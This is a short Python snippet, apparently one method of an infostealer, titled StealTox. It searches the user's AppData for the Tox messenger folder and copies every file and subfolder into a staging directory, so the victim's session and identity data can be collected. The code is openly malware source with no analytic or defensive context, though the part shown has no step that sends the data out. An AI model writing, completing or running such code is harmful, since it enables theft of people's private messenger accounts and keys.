import os
from pathlib import Path
import shutil


async def StealTox(self, directory_path: str) -> None:
    try:
        tox_folder = os.path.join(self.appdata, 'Tox')
        if os.path.isdir(tox_folder):
            tox_session = os.path.join(directory_path, "Messenger", "Tox")
            os.makedirs(tox_session, exist_ok=True)
            for item in Path(tox_folder).iterdir():
                if item.is_dir():
                    shutil.copytree(item, tox_session, dirs_exist_ok=True)
                else:
                    shutil.copy2(item, tox_session)
            if len(os.listdir(tox_session)) == 0:
                os.rmdir(tox_session)
    except Exception as e:
        print(f"tox error - {str(e)}")
        pass